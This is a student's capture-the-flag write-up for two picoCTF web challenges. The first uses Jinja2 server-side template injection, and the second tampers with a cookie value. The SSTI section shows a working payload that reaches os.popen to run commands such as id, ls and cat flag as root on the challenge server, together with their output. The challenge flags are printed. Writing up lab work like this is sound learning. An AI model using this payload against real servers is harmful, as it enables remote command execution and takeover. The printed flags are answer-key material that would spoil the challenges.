# SSTI1
> I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:

- I tried the common expressions `7*9`, `${7*9}`, `{{7*9}}`, `=<%= 7*9 %>`
- `7*9`, `${7*9}` and `=<%= 7*9 %>` gave the output `7*9`, `${7*9}` and `=<%= 7*9 %>` respectively
- But `{{7*9}}` actually executed the code and gave output `63`
- This implies that it executes Jinja2 (Python) code
- I looked up "how to ssti python" and found a bunch of commands which are as follows
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
- I found this payload that can execute commands and running it gives
```
uid=0(root) gid=0(root) groups=0(root)
```
- so my payload code is working and I can input anything I want...
- running the `ls` command using `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` gave output
```
__pycache__ app.py flag requirements.txt
```
- next logical step is to obviously `cat flag` using `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` which gives us the flag
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Concepts learnt:

- server-side template injection attack (SSTI) is when a hacker exploits and injects malicious payloads into the website.
- It can allow hackers to gain full control of a targeted server. 


## Resources:

- (https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/)
- (https://onsecurity.io/article/server-side-template-injection-with-jinja2/)


***




# Cookies
> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:64944/


## Solution:

- When searched for snickerdoodle the website changes to http://mercury.picoctf.net:64944/check but it doesnt change if something random like "aaa" is searched for.
- Since the challenge is called cookies I checked the cookies on firefox dev tools
- The cookie value is "0" when it's on snickerdoodle whereas it is "-1" for a random number
  <img width="1919" height="1016" alt="image" src="https://github.com/user-attachments/assets/59408767-9c4a-4a1e-83a5-6497bc9c8f6d" />

- So next I checked what happens if I put some other cookie... "pinwheel" has a value of 16
- This leads me to believe that the flag also must be a related to a cookie value.
- Upon manually entering values from 0 to 18, I found the flag on the 18. `picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}`




## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```

## Concepts learnt:

- cookies store data on client computer and are sent to server to display its associated information
- I can change the cookie value and see a different page


## Notes:

- I could have automated it using a script but my knowledge to is too elementary to write it by myself
- I discovered that burpsuite could be utilized for such purposes
- doing manually felt like i was doing it wrong... till i found the flag xD



***
